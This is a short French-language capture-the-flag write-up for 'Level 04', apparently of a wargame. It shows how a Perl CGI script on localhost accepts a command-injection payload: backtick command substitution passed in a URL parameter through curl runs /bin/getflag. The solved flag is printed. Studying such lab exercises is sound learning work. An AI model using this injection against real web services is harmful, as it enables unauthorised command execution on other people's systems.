# Level 04

## Recherche

il y a un fichier perl, on pense qu'il va falloir modifier ses acces et que le fichier affiche dans une page html le flag

je pense qu'il va falloir trouver une technique pour qu'il aille chercher getflag pendant l'execution

il y a le param dans le fichier qui me rend perplexe, on ne voit pas ce qu'il faut mettre. la version html a utiliser ? le chemin de getflag ? 

------

test de la command curl pour executer le programme 

__curl -v localhost:4747__ specifie que la commande est valide, elle recoit et renvoie quelque chose

__curl localhost:4747/?x=param__ affiche param, donc le x correspond au $y. 
on peut donc trouver une solution pour y inserer autre chose

__?x="/bin/getflag"__ ne fonctionne pas

__echo `ls`__ execute ls et non pas affiche ls

__curl localhost:4747/?x=`/bin/getflag`__ ne fonctionne pas non plus

__curl 'localhost:4747/?x=`/bin/getflag`'__ fonctionne ! le `xxx` permet de faire comprendre que c'est une entite en soit, et le 'xxx'  permet de dire qu'il y a des char speciaux a prendre en compte

## Flag : ne2searoevaevoem4ov4ar8ap


# Sitographie

